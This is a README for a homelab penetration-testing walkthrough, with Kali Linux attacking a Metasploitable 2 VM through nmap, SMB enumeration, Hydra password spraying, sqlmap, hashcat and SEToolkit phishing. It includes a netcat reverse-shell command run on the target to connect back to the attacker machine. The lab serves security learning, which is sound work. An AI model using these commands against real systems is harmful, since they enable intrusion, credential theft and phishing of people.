# kali-homelab-01
A documented attack chain demonstrating real penetration testing techniques. This lab walks through the complete kill chain from passive reconnaissance and active enumeration through credential harvesting and shell access. Built as a learning resource and portfolio project showing practical application of security tools and attack methodologies. Methods provided were used based on the youtuber: Loi Liang Yang. 

# Kali Linux Homelab Attack Chain

A documented walkthrough of setting up a penetration testing environment and executing a complete attack chain from reconnaissance through exploitation.

## Lab Setup

### Infrastructure
- **Kali Linux VM**: Attacker machine (3 CPU cores, 8GB RAM, 80GB storage)
- **Metasploitable 2 VM**: Intentionally vulnerable target (1 CPU core, 512MB RAM)
- **Hypervisor**: VirtualBox
- **Network**: Internal network for isolated lab environment

### Credentials
- Kali: credentials should never be posted, but ensure to change them from default credentials.
- Metasploitable: credentials should never be posted, but ensure to change them from default credentials.

### Network Configuration

Both VMs need to communicate on an internal network without internet exposure.

Set static IP addresses:

**Kali Linux:**
```bash
sudo ip addr add 192.168.50.10/24 dev eth0
sudo ip link set eth0 up
```

**Metasploitable 2:**
```bash
sudo ifconfig eth0 192.168.50.20 netmask 255.255.255.0 up
```

Verify connectivity:
```bash
ping -c 4 192.168.50.20
```

## Reconnaissance

### Passive Intelligence Gathering

**SpiderFoot** - OSINT tool for passive reconnaissance without touching the target directly.

What it does:
- Queries public databases for target information
- Finds subdomains, emails, leaked credentials
- Identifies associated social media accounts
- Gathers IP addresses, DNS records, hosting info
- Discovers metadata in public documents

Use case: Before any direct interaction with a target, gather publicly available information. In real pentests, this is always phase one.

### Active Port Scanning

**Nmap** - Identify what services are running on the target.

```bash
nmap 192.168.50.20
```

This shows open ports and running services. Look for interesting services like SMB (445), FTP (21), HTTP (80).

## Enumeration

### SMB Share Discovery

SMB (Server Message Block) is used for file and printer sharing. Port 445 is the standard.

```bash
nmap --script smb-enum-shares -p 445 192.168.50.20
```

This script queries the target and lists all available shares, including:
- Share name and type
- Anonymous access permissions
- Comment/description
- Path information

The Metasploitable target exposed 5 SMB shares. Two had anonymous read/write access:
- IPC$ (inter-process communication)
- tmp (general temporary files)

### Accessing Open Shares

Connect to readable shares using smbclient:

```bash
smbclient //192.168.50.20/tmp -N
```

The `-N` flag means no password (anonymous login).

Available commands in the SMB shell:
- `ls` - list files
- `get filename` - download a file
- `put filename` - upload a file

### FTP Anonymous Access

Check for FTP on the target:

```bash
nmap -p 21 192.168.50.20
```

Use msfconsole to find anonymous FTP access:

```bash
msfconsole
> use auxiliary/scanner/ftp/anonymous
> set RHOSTS 192.168.50.20
> run
```

This will show if anonymous login is allowed and what files are available.

## Credential Harvesting

### Password Spraying with Hydra

Hydra attempts login with username and password combinations. Create two wordlist files:

**usernames.txt:**
msfadmin
admin
**passwords.txt:**
msfadmin
password123

Run the attack:

```bash
hydra -L usernames.txt -P passwords.txt 192.168.50.20 smb
```

Hydra will try every username/password combination against the SMB service. When credentials are found, they can be used to access restricted shares:

```bash
smbclient //192.168.50.20/ADMIN$ -U msfadmin
```

## Exploitation

### Reverse Shell with Netcat

Netcat (nc) is a network utility that can be used for remote access.

**On Kali (listener):**
```bash
nc -nlvp 4444
```

This opens a listening port waiting for a connection.

**On Target (Metasploitable):**
```bash
nc 192.168.50.10 4444 -e /bin/bash
```

This connects back to Kali and provides shell access. You can now run commands on the target directly.

### Web Application Testing with ZAProxy

ZAProxy sits as a proxy between your browser and web applications, allowing you to:
- Inspect and modify raw HTTP traffic
- Scan for vulnerabilities (SQL injection, XSS, broken auth, etc.)
- Crawl and spider the application
- Fuzz input fields to test for weak handling

Usage: Configure your browser to proxy through ZAProxy, then browse normally. ZAProxy logs and analyzes all traffic.

### Social Engineering with Social Toolkit

Social Toolkit (setoolkit) makes it easy to create convincing phishing sites.

```bash
sudo setoolkit
```

Options include:
- Clone legitimate websites to harvest credentials
- Create custom phishing emails
- Generate exploit files

This demonstrates how simple it is to conduct social engineering attacks.

### SQL Injection with SQLmap

SQLmap automates SQL injection discovery and exploitation.

```bash
sqlmap -u "http://192.168.50.184/vulnerable/page.php?id=1"
```

This will:
- Test parameters for SQL injection vulnerabilities
- Extract database information
- Dump table contents
- Potentially gain database access

### Password Cracking with Hashcat

For hashes obtained during exploitation:

```bash
hashcat -m 1000 hashes.txt wordlist.txt
```

This attempts to crack password hashes using a wordlist of common passwords.

## Key Learnings

1. Reconnaissance comes first. Understand your target before attacking.
2. Often multiple small vulnerabilities chain together. One open share might not do damage alone, but combined with credential access, it becomes critical.
3. Default credentials are surprisingly common in real environments.
4. Social engineering is often easier than technical exploitation.
5. Passive recon (OSINT) should always precede active scanning to avoid detection.
6. A single lab environment can demonstrate multiple attack vectors and tool usage.

## Tools Summary

| Tool | Purpose | Type |
|------|---------|------|
| Nmap | Port scanning and service discovery | Active Recon |
| SpiderFoot | Passive intelligence gathering | Passive Recon |
| Hydra | Password spraying and brute force | Exploitation |
| Netcat | Raw network connections and shells | Post-Exploitation |
| ZAProxy | Web application testing | Active Recon |
| SQLmap | SQL injection detection and exploitation | Exploitation |
| Social Toolkit | Phishing and social engineering | Social Engineering |
| Hashcat | Password hash cracking | Post-Exploitation |
